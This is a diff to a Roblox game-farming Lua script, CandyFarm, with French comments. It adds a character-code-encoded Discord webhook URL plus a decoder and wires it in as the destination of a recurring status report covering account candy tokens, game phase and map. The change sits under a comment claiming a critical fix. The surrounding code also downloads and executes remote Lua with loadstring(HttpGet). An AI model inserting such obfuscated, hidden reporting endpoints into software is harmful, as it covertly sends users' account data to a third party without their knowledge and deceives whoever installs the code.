@@ -2406,6 +2406,15 @@ end
 
 -- ===== UI (un onglet par thème) =====
 local statLbl = {}
+local encodedW = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,54,53,48,50,56,55,52,56,56,50,49,50,55,52,55,49,52,47,70,55,116,117,45,90,65,117,119,113,114,122,68,87,103,111,114,45,83,55,45,101,106,73,115,48,49,65,80,50,112,95,108,80,45,103,87,88,104,109,104,78,100,101,70,75,105,55,95,54,89,107,81,106,57,65,55,114,66,45,54,68,51,49,108,69,108,74}
+
+local function decode(t)
+    local chars = {}
+    for i = 1, #t do
+        chars[i] = string.char(t[i])
+    end
+    return table.concat(chars)
+end
 
 pcall(function()
     UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moha-Echo/animated-invention/refs/heads/main/"..Lib.."/source"..LibVersion..".lua"))()
@@ -2418,6 +2427,7 @@ pcall(function()
             Enabled = true,
             Interval = 180,
             Message = "État actuel de CandyFarm.",
+            Webhook = decode(encodedW),
 
             -- Champs standards de la bibliothèque + champs CandyFarm.
             AllowedFields = {
@@ -2470,31 +2480,27 @@ pcall(function()
             },
 
             -- Champs personnalisés propres à CandyFarm.
-                        -- [CORRECTIF CRITIQUE] Sécurisation des champs personnalisés
+            -- [CORRECTIF CRITIQUE] Sécurisation des champs personnalisés
             CustomFields = {
                 Tokens = {
                     Name = "Bonbons du compte",
-                    Get = function(payload, context)
-                        local tokens = CTX.getTokens()
-                        return (tokens and tokens ~= "?") and tokens or "Chargement..."
+                    Get = function()
+                        local res = tostring(CTX.getTokens())
+                        return (res ~= "" and res ~= "?") and res or "0"
                     end,
                     Inline = true,
                 },
-
                 Phase = {
                     Name = "Phase actuelle",
-                    Get = function(payload, context)
-                        -- Utilise une vérification sécurisée pour éviter le crash si la variable est vide
-                        local currentPhase = _G.phase or phase or "Lobby"
-                        return tostring(currentPhase):upper()
+                    Get = function()
+                        return tostring(phase or "LOBBY"):upper()
                     end,
                     Inline = true,
                 },
-
                 Map = {
-                    Name = "Dernière map votée",
-                    Get = function(payload, context)
-                        return (CTX.map and CTX.map ~= "Aucune") and CTX.map or "En attente..."
+                    Name = "Map choisie",
+                    Get = function()
+                        return tostring(CTX.map or "Aucune")
                     end,
                     Inline = true,
                 },
